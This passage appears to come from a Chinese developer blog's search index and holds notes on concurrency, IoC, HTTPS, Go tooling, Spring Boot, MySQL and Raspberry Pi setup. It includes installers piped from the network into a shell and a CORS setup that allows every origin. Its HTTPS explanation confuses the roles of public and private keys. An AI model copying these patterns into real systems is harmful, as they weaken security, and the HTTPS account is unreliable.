    <content type="text"><![CDATA[死锁 死锁就是两个或两个以上的线程争夺同一资源而形成的一种僵持状态，这种状态在没有外力的作用下将一直持续下去 例子：比如馍夹菜这道菜，需要馒头和菜，A线程抢到了馒头，而B线程抢到了菜，这时A需要B的菜，而B需要A的馒头，他们都不愿放弃手中的资源而一直僵持下去，这种就叫做死锁 活锁 活锁简单来说就是同时释放，又同时拿，还是上面那个例子，A放弃了馒头，B也放弃了菜，可他们又同时拿了资源，又会造成僵持 例子： 在路上走路的时候，迎面来了一个人，这时你想给他让路，所以你向左边移动，而他也想给你让路，所以他也向左边移动，此时你俩又是无法通过，又彼此让路，又无法通过。。。。就这样一直持续下去，这种就是活锁。 IOC IOC(Inversion of Control) 控制反转，你要明白是什么被反转了，是对象的获取过程被反转了，之前是我们手动去new一个对象，不需要的时候在销毁对象，手动去管理对象之间的依赖关系，而现在是将对象托管给容器管理。。它有两种实现方式，一种是DI（Dependency Injection）依赖注入，也是最常见的方式，另一种是DL（Dependency Lookup）依赖查找 例子：你去餐馆吃饭，服务员只需要把菜单给你，你点菜就可以了，而这里菜就是对象，你不需要知道这个菜是怎们做的，材料和菜谱什么的你都不需要关心，这种方式就是IOC，你无需关心 HTTPS https是一种加密的网络传输协议，它不同于http，http是无状态的，并且信息是可篡改的。客户端在第一次是通过非对称加密拿到秘钥，客户端访问https服务器时会发送公钥，https服务器通过CA颁发的证书利用公钥对信息（秘钥）进行加密，客户端可以利用私钥拿到这个信息（秘钥），以后通信就可以用这个秘钥进行对称加密 例子： http 就好比飞鸽传输，飞鸽把信息直接绑在腿上，任何人都可以截获这个飞鸽并且把信息更换掉，可见这种方式是极其不安全的，那怎么办了？我们可以把信息加密不就好了，比如字母每个都+1，这样 abc就变成了 bcd ，服务端在收到这个信息之后再把字母-1 就又变成了abc，可这个 +1 的信息怎么通知服务端呢，如果别人拿到了这个信息不是就可以轻易破解我们的信息并篡改他们了吗，这时就需要用到了非对称加密，通过公钥对信息加密，再通过私钥进行加密。而 https 就好比 客户端在飞鸽上绑了一个开着锁的盒子发给服务端，服务端将 加密秘钥 （+1信息）放到盒子里并锁上锁发给客户端，这样客户端就可以通过钥匙打开锁，并拿到这个秘钥，以后都通过这个秘钥对信息加密。在这里CA证书就充当了盒子的身份。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以生活的例子说明单线程和多线程]]></title>
    <url>%2F2019%2F04%2F27%2F%E4%BB%A5%E7%94%9F%E6%B4%BB%E7%9A%84%E4%BE%8B%E5%AD%90%E8%AF%B4%E6%98%8E%E5%8D%95%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[以生活例子说明单线程与多线程 转载自：书圈 1. 程序设计的目标在我看来单从程序的角度来看，一个好的程序的目标应该是性能与用户体验的平衡。当然一个程序是否能够满足用户的需求暂且不谈，这是业务层面的问题，我们仅仅讨论程序本身。围绕两点来展开，性能与用户体验。 性能：高性能的程序应该可以等同于CPU的利用率，CPU的利用率越高(一直在工作，没有闲下来的时候)，程序的性能越高。体验：这里的体验不只是界面多么漂亮，功能多么顺手，这里的体验指程序的响应速度，响应速度越快，用户体验越好。 下面我们就这两点进行各种模型的讨论。 2. 单线程多任务无阻塞以生活中食堂打饭的场景作为比喻，假设有这样的场景，小A，小B，小C 在窗口依次排队打饭。 假设窗口负责打饭的阿姨打一个菜需要耗时1秒。如果小A需要2个菜，小B需要3个菜，小C需要2个菜。如下： 阿姨(CPU)：打一个菜需要1秒小A：2个菜小B：3个菜小C：2个菜 那么在这种模型下将所有服Wu做完阿姨需要耗时 2 + 3 + 2 = 7秒阿姨 = CPU小A,小B,小C = 任务(这里是以任务为概念，表示需要做一些事情)这种模型下CPU是满负荷不间断运转的，没有空闲，用户体验还不错。这种程序中每个任务的耗时都比较小，是非常理想的状态，一般情况下基本不太可能存在。 3. 单线程多任务IO阻塞将上面的场景稍微做改动：阿姨：打一个菜需要1秒小A：2个菜，但是忘记带钱了，要找同学送过来，估计需要等5分钟可以送到(可以理解为磁盘IO)小B：3个菜小C：2个菜 这种情况下小A这里发生了阻塞，实际上小A这里耗费了5分钟也就是 300秒+ 2个菜的时间，也就是302秒，而CPU则空闲了300秒，实际上工作2秒。 所有服Wu做完花费 302 + 3 + 2 = 307秒 CPU实际工作7秒，等待300秒。 极大浪费了CPU的时钟周期。 用户体验很差，因为小A阻塞的时候，后面的所有人都等着，而实际上此时CPU空闲。所以单线程中不要有阻塞出现。 4. 单线程多任务异步IO还是上面的模型，加入一个角色：值日生小哥，他负责事先询问每一个人是否带钱了，如果带钱了则允许打菜，否则把钱准备好了再说。 &lt;1&gt; 值日生小哥问小A准备好打菜了吗，小A说忘带钱了，值日生小哥说，你把钱准备好了再说，小A开始准备(需要300秒，从此刻开始记时)。&lt;2&gt; 值日生小哥问小B准备好打菜了吗，小B说可以了，阿姨服务小B，耗时3秒&lt;3&gt; 值日生小哥问小C准备好打菜了吗，小C说可以了，阿姨服务小C，耗时2秒&lt;4&gt; 值日生小哥问小A准备好了没有，小A说还要等一会，阿姨由于没有人过来服务，处于空闲状态&lt;5&gt; 300秒之后，小A准备好了，阿姨服务小A，耗时2秒 整个过程做完耗时 300 + 2 = 302秒 CPU工作7秒，空闲295秒 值日生小哥相当于select模型中的select功能，负责轮询任务是否可以工作，如果可以则直接工作，否则继续轮询。在小A阻塞的300秒里面，阿姨(CPU)没有傻等，而是在服务后面的人，也就是小B和小C，所以这里与模型3不同的是，这里有5秒CPU是工作的。 如果打饭的人越多，这种模型CPU的利用率越高，例如如果有小D，小E，小F…… 等需要服务，CPU可以在小A阻塞的300秒期间内继续服务其他人。实际上值日生小哥轮询也会耗时，这个耗时是很少的，几乎可以忽略不计，但是如果任务非常多，这个轮询还是会影响性能的，但是epoll模型已经不使用轮询的方式，相当于A，B，C会主动跟值日生小哥报告，说我准备好了，可以直接打菜了。 这种模式下用户体验好，CPU利用率高(任务越多利用率越高) 5. 单线程多任务，有耗时计算回到最开始的模型，如下：阿姨：打一个菜需要1秒小A：200个菜小B：3个菜小C：2个菜 顺序做完所有任务，需要耗时 200 + 3 + 2 = 205秒， CPU无空闲，但是用户体验却不是很好，因为显然后面的 B，C 需要等待小A 200秒的时间，这种情况下是没有IO阻塞的，但是任务A本身太耗CPU了，所以说如果单线程◇◇现了耗时的操作，一定会影响体验(IO操作或者是耗时的计算都属于耗时的操作，都会导致阻塞，但是这两种导致阻塞的性质是不一样的)。在所有的单线程模型中都不允许出现阻塞的情况，如果出现，那么用户体验是极差的，例如在UI编程中(QT,C# Winform)是不允许在UI线程中做耗时的操作的，否则会导致UI界面无响应。 编写Nodejs程序的时候，我们所写的代码实际上是在一个线程中执行的，所以也不允许有阻塞的操作(当然整个Nodejs框架实现异步，一定不止一个线程)。 出现阻塞的情况一般有2种，一种是IO阻塞，例如典型的如磁盘操作，这种情况下的阻塞会导致CPU空闲等待(当然现代操作系统中如果IO阻塞，操作系统一定会将导致IO阻塞的线程挂起)。这种阻塞的情况，可以通过异步IO的方法避免，这样就避免程序中仅有的单线程被操作系统挂起。另一种情况下是确实有非常多的计算操作，例如一个复杂的加密算法，确实需要消耗非常多的CPU时间，这种情况下CPU并不是空闲的，反而是全负荷工作的。这种CPU密集的工作不适合放在单线程中，虽然CPU的利用率很高，但是用户体验并不是很好。这种情况下使用多线程反而会更好，例如如果3个任务，每个任务都在一个线程中，也就是有3个线程，A任务在ThreadA中，B任务在ThreadB中，C任务在ThreadC中，那么即使A任务的计算量比较大，B，C两个任务所在的线程也不必等待A任务完成之后再工作，他们也有机会得到调度，这是由操作系统来完成的。这样就不会因为某一个任务计算量大，而导致阻塞其他任务而影响体验了。 6. 多线程程序我们将上面的模型改造成多线程的模型是怎样的呢，我们在模型5的基础上添加一个角色，管理员大叔(操作系统的角色)：阿姨：打一个菜需要1秒小A：200个菜小B：3个菜小C：2个菜 加入管理员大叔之后变成这样的了，小A打两个菜之后，大叔说，你打的菜太多了，不能因为你要打200个菜，让后面的同学都没有机会打菜，你打两个菜之后等一会，让后面的同学也有机会。 大叔让小B打两个菜，然后让小C打两个菜(小C完成)，然后再让小A打两个菜(完成之后小A总共就有4个菜了)，再让小B打1个菜(此时小B总共打3个菜，完成)，然后小A打剩下的196个菜。 CPU的利用率：很高，阿姨在不断的工作 用户体验：不错，即使小A要打200个菜，小B，小C也有机会。 当然如果小A说我是帮校长打菜，要快一点(线程优先级高)，那也只能先把小A服务完 总耗时： 200 + 3 + 2 + (大叔指挥安排所消耗的时间，包括从小C切换回小A的时候，大叔要知道小A上次打的菜是哪两个，这次应该接着打什么菜，这相当于线程上下文切换的开销以及线程环境的保存与恢复)，所以并不是线程越多越好，线程非常多的时候大叔估计会焦头烂额吧，要记住这么状态，切换来切换去也耗时间。 这种模型下实际上是将小A的耗时任务，分成多份去执行而不是集中执行，所以小A要完成他的任务，可能需要更多的时间(期间他也需要等别人，阿姨不会一直为他一个人服务，但是阿姨为他服务的时间是没有变化的)，这种其实有点以时间换取用户体验(小B和小Ｃ的体验，小Ａ的体验可能就不会那么好了，但是小Ａ本来也非常耗时，所以多等一会是不是也没关系) 那么IO阻塞和CPU计算耗时阻塞这两者有什么区别呢？ 区别在于IO阻塞是不使用CPU的，而CPU计算耗时导致的阻塞是会使用CPU的。 例如上面的例子中，小A说忘记带钱了需要同学送钱，于是小A等着同学送钱过来，这个过程中阿姨并没有为小A提供服务，这个过程中为小A提供服务的是他的同学(送钱过来)，实际上小A的同学相当于现代计算机系统中的DMA(直接内存操作)，小A同学送钱的过程相当于DMA从磁盘读取数据到内存的过程，这个过程基本不需要CPU干预。 当然在DMA技术还没有出现的年代，从磁盘读取文件也是需要CPU发送指令去读取的，也就是说需要CPU的计算，应用到这里的场景中，就是阿姨亲自跑一趟帮小A把钱拿过来。 7. 多CPU多CPU是一个更加复杂的问题，多CPU如何调度？ 小A在第一个窗口打两个菜，又跑到第二个窗口打两个菜这种情况如何处理。小A在第一个窗口，小B在第二个窗口他们要同一个菜，但是这个菜只够一个人，那么两个窗口阿姨如何分配这种需求(实际上应该是由操作系统也就是管理员大叔来决定如何分配，也就是多核下的线程同步与互斥)？ 多核CPU情况下，多线程的调度，互斥，锁与同步相对来讲更加复杂，多核情况下是真正的并行，同一时刻有多个线程在同时运行，他们的竞争怎么处理，多个CPU之间如何同步(多CPU之间的缓存状态一致性)等等一系列的问题。 8. 多线程与多进程上面描述的多线程实际上是讨论的是多线程的调度问题，这里我们说一说多线程与多进程与资源的分配问题。什么意思呢，一群人(多个线程)在一个桌子(进程)上吃饭，他们会涉及到一些问题，比如多个人可能会夹一个菜(竞争)，A和B同时看到盘子里面有一块肉，同时伸出筷子去夹，A先夹走，B迟了一点伸到盘子的时候已经没了，只能缩回来(临界资源，互斥)，有一个点心需要用馍夹肉一起吃。A夹了肉，B夹了馍，A需要B的馍，B需要A的肉，他们僵持不下谁都不让步(死锁)。 多线程之间的资源共享是非常方便的，因为他们共用进程的资源空间（在一个桌子上），但是需要注意一系列的问题，竞争，死锁，同步等。如果在旁边再开一个桌子(进程)。 那么桌子之间讲话，递东西又不方便(进程间通信)，而开一个桌子的开销比在一个桌子上多加一个人的开销要大。另外一个桌子上的人数不可能无限制增加，桌子的容量有限也坐不下这么多人(进程的线程句柄是有限制的)。一个桌子坏了不会影响到另一个桌子上面人的就餐情况(进程间相互DuLi，一个进程崩溃不会影响另一个)，而一个桌子上的某人喝挂了需要送医院，估计这一桌人都要散了(线程挂掉会导致整个进程也挂掉)。所以多线程与多进程是各有优缺点，不能一概而论。 说明：多线程桌子的比喻受到知乎用户［pansz］的启发，但是该比喻似乎说明不了线程同步的情况。 9. 总结单线程程序：适合IO异步，不能阻塞，不能有大量耗CPU的计算。典型如Nodejs，还有一些网络程序]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>单线程</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go语言入门（5）安装第三方库]]></title>
    <url>%2F2019%2F04%2F24%2FGo%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%EF%BC%885%EF%BC%89%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%2F</url>
    <content type="text"><![CDATA[通过go get 去获取github上的第三方库是没什么问题的，但是要获取google的就不行了，没办法，所以我们通过gopm这个工具来获取Google的第三方库 1. 安装gopm1go get github.com/gpmgo/gopm 2. 通过gopm安装我们安装一个go 的 import 工具 1gopm get -g -v golang.org/x/tools/cmd/goimports -g 参数是将包下载到 GOPATH 路径下-v 参数是显示下载过程 3. 安装下载的库1go install golang.org/x/tools/cmd/goimports 这个命令可以生成一个可执行文件到GOPATH/bin 路径下]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>gopm</tag>
        <tag>goimports</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows配置go-micro开发环境]]></title>
    <url>%2F2019%2F04%2F24%2Fwindows%E9%85%8D%E7%BD%AEgo-micro%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[1. 安装protobuf下载protoc.exe点击下载下载protoc-3.8.0-rc-1-win64.zip 下载解压后，将路径配置到环境变量里。 安装插件以go get 方式安装 安装protoc-gen-go 12go get -v github.com/golang/protobuf/protogo get -v github.com/golang/protobuf/protoc-gen-go 安装go-micro 1go get -v github.com/micro/go-micro 2.编译proto1234567E://protoc/bin/protoc.exe --plugin=protoc-gen-go=F://goWork/bin/protoc-gen-go.exe --proto_path=./ --go_out=./ --plugin=protoc-gen-micro=F://goWork/bin/protoc-gen-micro.exe --micro_out=./ user.proto 3. 设置Consul注册中心consul可以使用docker进行安装，可以看我之前的博客点击查看 1234567891011121314151617// 注册中心 reg := consul.NewRegistry(func(op *registry.Options) &#123; op.Addrs = []string&#123; "127.0.0.1:8500", &#125; &#125;) //创建一个服务 service := micro.NewService(micro.Name("micro.service.user"), micro.Registry(reg), micro.RegisterTTL(time.Second*10), //10s检查等待时间 micro.RegisterInterval(time.Second*5), // 服务每5s发一次心跳 ) proto.RegisterUserServiceHandler(service.Server(), new(handler.User)) err := service.Run() if err != nil &#123; log.Println(err.Error()) &#125;]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>protobuf</tag>
        <tag>golang</tag>
        <tag>go-micro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SprintBoot任意处获取Request对象]]></title>
    <url>%2F2019%2F04%2F21%2FSprintBoot%E4%BB%BB%E6%84%8F%E5%A4%84%E8%8E%B7%E5%8F%96Request%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[老样子，直接上代码 方式一（粗暴，推荐）123456789101112131415161718192021222324252627282930package com.pibgstar.demo.utils;import org.springframework.web.context.request.RequestAttributes;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;/** * @author pibigstar * @desc 获取request和response对象 **/public class WebUtil &#123; /** 获取request对象 **/ public static HttpServletRequest getRequest()&#123; RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes(); if (requestAttributes == null)&#123; return null; &#125; return ((ServletRequestAttributes)requestAttributes).getRequest(); &#125; /** 获取response对象 **/ public static HttpServletResponse getResponse()&#123; RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes(); if (requestAttributes == null)&#123; return null; &#125; return ((ServletRequestAttributes)requestAttributes).getResponse(); &#125;&#125; 方式二（简单）在你需要的地方，注入即可 1234@AutowiredHttpServletRequest request;@AutowiredHttpServletResponse response]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>request</tag>
        <tag>response</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL实战45讲学习笔记（8~15）]]></title>
    <url>%2F2019%2F04%2F21%2FMySQL%E5%AE%9E%E6%88%9845%E8%AE%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%888~15%EF%BC%89%2F</url>
    <content type="text"><![CDATA[本文为极客时间《MySQL实战45讲》的总结笔记，如有侵权，请通知我，将立马删除。建议大家去购买这套课程，真的是物有所值。 9. 选择普通索引还是唯一索引？9.1 查询过程 其实查询过程两者的时间差距是微乎其微的，普通索引要比唯一索引多一次判断下一条记录是否符合，但InnoDB 的数据是按数据页为单位来读写的，所以就算多读一次也占用不了多少时间 9.2 更新过程 普通索引可以使用change buffer，可以将一系列的更新写到change buffer中，后期再一次性写入到磁盘中，极大的提高了更新的效率，而唯一索引没有办法使用change buffer 9.3 change buffer 的使用场景 对于写多读少的业务来说，页面在写完以后马上被访问到的概率比小，此时 change buffer 的使用效果最好。这种业务模型常见的就是账单类、日志类的系统。反过来，如果所有的更新后面，都马上伴随着对这个记录的查询，那么你应该关闭change buffer 10. MySQL为什么有时候会选错索引?Mysql是根据扫描行数来判断选择哪个索引，扫描行数越少，则越容易被选择，查看扫描行数可以通过explain关键字来查看。 1explain select * from user where sex = 1 既然Mysql是根据扫描行数来选择索引的，它选错索引肯定也是因为在判断扫描行数的时候出了问题，那Mysql又是怎么来判断扫描行数的呢？答案是：采样统计是的就是这么不靠谱的采样，Mysql官方也说了这个误差可能会达到30%~50% 对于这种情况我们可以使用analyze table 表名来重新统计索引信息达到让Mysql选择正确的索引。或者使用force index来强制给它指定一个索引 1select * from user force index(sex) where sex = 1 11. 怎么给字符串字段加索引？1. 利用前缀索引如果字符串过长，而前面几个字段可以确定一个唯一值，比如邮箱，前面都是几位数字+@qq.com，我们不用给全部字段加上索引，而只需要索引前面几个数字即可，这样就极大的节省索引占的空间了。 1alter table user add index index_email(email,9) 这个数字9怎么去确定呢，我们可以通过下面的语句，来尝试，如果查出来的值越少，就越好。 1234select count(distinct left(email,7)) as L7, count(distinct left(email,8)) as L8, count(distinct left(email,9)) as L9,from user 2. 反转字符串有的时候字段前面都是一样，而后面是不一样的，比如身份证号，这时就不好利用前缀索引了，不过我们可以将身份证的倒序存储，这样就巧妙的再次利用前缀索引的优势了。 1select * from t where id_card = reverse('input_id_card'); 3. 使用Hash这种就是将字符串计算出一个hash值，然后给表新增一个字段将hash存储进去，下次查找时先将字符串换算为hash再去表中查找hash列，不过这种只适合等值查询，不能进行范围查询。 12. 为什么我的MySQL会“抖”一下？当Mysql执行过程中会突然慢下来，过一会又好了，而且不是随机的，持续时间很短，看起来就好像Mysql“抖”了一下。这个过程其实是Mysql在刷”脏页”的过程。 当内存数据页跟磁盘数据页内容不一致的时候，我们称这个内存页为“”脏页”，当把内存中的数据更新到硬盘之后这个页也就变成了“干净页” 大概下面四种情况会发生刷“脏页”过程： redo log 写满了。当redo log写满了之后，系统会停止所有更新操作，将redo log的checkpoint往前推进，让redo log可以留出空间继续写。 系统内存不足，淘汰脏页时。当需要新的内存页，而内存不足时就需要淘汰一些数据页空出内存给别的数据页使用，如果淘汰的是“脏页”，那么就需要把“脏页”数据写入到磁盘中。 当系统空闲时。当系统空闲时就会将一点一点的将脏页数据刷新到磁盘中 当Mysql正常关闭时。Mysql正常关闭时会将内存中的脏页数据全部刷新到磁盘中。 我们可以通过设置innodb_io_capacity参数来控制Mysql刷脏页的速度，如果你用的是SSD，那么建议你把这个参数设置大点。这个参数在information_schema数据库中的GLOBAL_VARIABLES表中设置。 13. 为什么表数据删掉一半，表文件大小不变？当innodb_file_per_table的参数为OFF时，表的数据会放到共享内存中，也就是和数据字典放一块。而为ON时，表的数据存储在以.ibd为后缀的文件中，当我们使用drop table删除表时，会直接删除这个文件达到回收的目的，而如果数据是放到了共享内存中，那么即使表删除了，空间也是不会回收的。所以我们一般都将此参数设置为ON，MySQL5.5.6版本之后默认就是ON了。 13.1 删除流程当我们删除某一行记录时，其实MySQL只是把此行记录标记为了“可复用”，但磁盘大小是不会变的，所以通过delete表中记录是达不到回收表空间的。这些被标记为“可复用”而没有使用的空间看起来就像是“空洞”，其实不止删除会造成空洞，插入一样可以，如果我们不是按顺序插入，而是随机插入，那么就可能造成页分裂，而之前那一页末尾可能还有未使用的空间。 13.2 怎么回收表空间我们可以通过重建表来达到回收表空间，可以使用下面这个命令： 1alter table 表名 engine = InnoDB 三种重建方式对比： recreate重建表 1alter table 表名 engine = InnoDB 重新统计索引信息 1analyze table 表名 recreate + 重新统计索引信息 1optimize table 表名 14. count(*)这么慢，我该怎么办？以下的讨论都是没有where条件判断的，如果有条件判断，则不适用。 对于MyISAM引擎，它会将一个表的总行数存储在磁盘中，所以它的count(*)效率很高 而对于InnoID引擎，由于MVCC多版本并发控制，它必须一行一行的去读取然后计算总数。 执行速度比较count(其他字段) &lt; count(主键) &lt; count(1) ≈ count(*) 解决方案 将总数存储在Redis中（不推荐，可能会导致数据不一致） 单独存储到MySQL一张表中（可使用事务，来避免数据不一致等情况） 15. 日志和索引相关问题15.1 MySQL 怎么知道 binlog 是完整的?答: 一个事务的 binlog 是有完整格式的 statement 格式的 binlog，最后会有 COMMIT； row 格式的 binlog，最后会有一个 XID event 15.2 redo log 和 binlog 是怎么关联起来的?答：它们有一个共同的数据字段，叫 XID。崩溃恢复的时候，会按顺序扫描 redo log 如果碰到既有 prepare、又有 commit 的 redo log，就直接提交； 如果碰到只有 parepare、而没有 commit 的 redo log，就拿着 XID 去 binlog 找对应的事务。 15.3 处于 prepare 阶段的 redo log 加上完整 binlog，重启就能恢复，MySQL 为什么要这么设计?答：其实，这个问题还是跟我们在反证法中说到的数据与备份的一致性有关。在时刻 B，也就是 binlog 写完以后 MySQL 发生崩溃，这时候 binlog 已经写入了，之后就会被从库（或者用这个 binlog 恢复出来的库）使用。所以，在主库上也要提交这个事务。采用这个策略，主库和备库的数据就保证了一致性。 15.4 能不能只用redo log，不要binlog？回答：如果只从崩溃恢复的角度来讲是可以的。你可以把binlog关掉，这样就没有两阶段提交了，但系统依然是crash-safe的。但是，如果你了解一下业界各个公司的使用场景的话，就会发现在正式的生产库上，binlog都是开着的。因为binlog有着redo log无法替代的功能。 一个是归档。 redo log是循环写，写到末尾是要回到开头继续写的。这样历史日志没法保留 ，redo log也就起不到归档的作用。 一个就是MySQL系统依赖于binlog。 binlog作为MySQL一开始就有的功能，被用在了很多地方。其中，MySQL系统高可用的基础，就是binlog复制。 还有很多公司有异构系统（比如一些数据分析系统） 这些系统就靠消费MySQL的binlog来更新自己的数据。关掉binlog的话，这些下游系统就没法输入了。 总之，由于现在包括MySQL+高可用在内的很多系统机制都依赖于binlog，所以“鸠占鹊巢”redo log还做不到。]]></content>
      <categories>
        <category>面试,mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go语言入门（4）dep包管理]]></title>
    <url>%2F2019%2F04%2F21%2FGo%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%EF%BC%884%EF%BC%89dep%E5%8C%85%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[1. 什么是dep？ dep和go，在一定程度上相当于maven之于Java，composer之于PHP，dep是go语言官方的一个包管理工具。相比较go get而言，dep可以直接给引入的第三方包一个专门的目录，并且可以专门制定一个配置文件，控制go项目所引入的包，版本以及其他依赖关系。 dep这个项目放在golang官方的github中：https://github.com/golang/dep 2. 安装 Mac系统： 1brew install dep Linux系统 1curl https://raw.githubusercontent.com/golang/dep/master/install.sh | sh Windows系统 1go get -u github.com/golang/dep/cmd/dep 3. 使用3.1 初始化在项目根目录下执行 dep init 即可完成初始化，此时会生成三个文件 vendor文件夹存放我们项目需要的包文件 Gopkg.lock文件 Gopkg.toml 文件是我们可以编辑的文件，通过编辑这个文件，并运行dep ensure的命令可以达到引入包的目的： Gopkg.toml: 1234567891011121314151617# 必需包required = ["github.com/gin-gonic/gin"]# 忽略包#ignored = []没有可以不写# 项目元数据#[metadata]# 约束条件[[constraint]] # name = # 可选：版本 # version = # 分支 # branch # 修订 # revision # 可选：指定来源 # source = "github.com/gin-gonic/gin" 3.2 导包使用 dep ensure 即可引入当前项目所需要的包到vendor文件夹中 3.3 查看状态使用 dep status命令查看状态]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>dep</tag>
        <tag>go包管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot允许跨域访问]]></title>
    <url>%2F2019%2F04%2F21%2FSpringBoot%E5%85%81%E8%AE%B8%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[当它请求的一个资源是从一个与它本身提供的第一个资源的不同的域名时，一个资源会发起一个跨域HTTP请求(Cross-site HTTP request)。 一般都是异步请求会有这个问题，比如：Ajax，XMLHttpRequest等 使用@Configuration（推荐）1234567891011121314151617181920212223242526import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.cors.CorsConfiguration; import org.springframework.web.cors.UrlBasedCorsConfigurationSource; import org.springframework.web.filter.CorsFilter; @Configuration public class CorsConfig &#123; @Bean public CorsFilter corsFilter() &#123; UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration("/**", buildConfig()); return new CorsFilter(source); &#125; private CorsConfiguration buildConfig() &#123; CorsConfiguration corsConfiguration = new CorsConfiguration(); // 1允许任何域名使用 corsConfiguration.addAllowedOrigin("*"); // 2允许任何头 corsConfiguration.addAllowedHeader("*"); // 3允许任何方法（post、get等） corsConfiguration.addAllowedMethod("*"); return corsConfiguration; &#125; &#125; 使用Filter123456789101112131415161718import javax.servlet.*; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @Component public class CorsFilter implements Filter &#123; public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123; HttpServletResponse response = (HttpServletResponse) res; response.setHeader("Access-Control-Allow-Origin", "*"); response.setHeader("Access-Control-Allow-Methods", "POST, GET"); response.setHeader("Access-Control-Max-Age", "3600"); response.setHeader("Access-Control-Allow-Headers", "x-requested-with"); chain.doFilter(req, res); &#125; public void init(FilterConfig filterConfig) &#123;&#125; public void destroy() &#123;&#125; &#125;]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>cors</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派初始开机配置]]></title>
    <url>%2F2019%2F04%2F21%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%BC%80%E6%9C%BA%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[1. 开启ssh在 内存卡 的 /boot 目录下 新增 一个 ssh 文件夹即可 2. 设置WiFi连接在 内存卡 的 /boot 目录下 新增 一个 wpa_supplicant.conf 文件，里面内容如下 123456789country=CNctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1network=&#123; ssid="wifi名" psk="wifi密码" priority=1&#125; 3. 查看IP地址登录到你路由器后台查看，一般路由器的后台地址都为192.168.1.1，密码一般是123456设备名一般是raspberrypi 4. 修改密码12345# 修改 pi 用户密码sudo passwd pi# 修改root密码sudo passwd root 5. 设置时区 输入date命令看查看当前系统时间 123# 打开时区设置sudo dpkg-reconfigure tzdata# 选择Asia ---&gt; ShangHai 6. 安装vim树莓派默认是 nano编辑器，用着不太爽，用 vim替换它 1234# 更新下软件源sudo apt-get update# 安装vimsudo apt-get install -y vim 改下配置 1sudo vim /etc/vim/vimrc 简单配一下 1234# 语法高亮syntax on# 显示行号set nu 7. 安装oh-my-zsh查看当前使用的shell 1echo $SHELL 查看系统中所有shell 1cat /etc/shells 安装zsh 1sudo apt-get install zsh 修改配置 1vim ~/.zshrc 添加 12345678ZSH_THEME="blinks"ENABLE_CORRECTION="true"# 为zsh添加git和sudo插件plugins=(git sudo)alias ll='ls -all'alias vi='vim'alias ps='ps -A'alias ifconfig='sudo ifconfig' 切换shell为zsh 1chsh -s /bin/zsh 刷新设置 1source ~/.zshrc 安装oh-my-zsh 1sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)" 8. 开启vnc远程桌面1sudo apt-get install tightvncserver 启动 1tightvncserver :1 关闭 1vncserver -kill :1 关于配置noVNC的，可以查看我之前的文章：https://blog.csdn.net/junmoxi/article/details/100977131 9. 设置内网穿透用的是 ngrok 比较方便，这是教程可以参考：https://www.jianshu.com/p/8702f55d57e3 ngrok 官网： https://www.ngrok.cc]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式Id自增生成器]]></title>
    <url>%2F2019%2F04%2F16%2F%E5%88%86%E5%B8%83%E5%BC%8FId%E8%87%AA%E5%A2%9E%E7%94%9F%E6%88%90%E5%99%A8%2F</url>
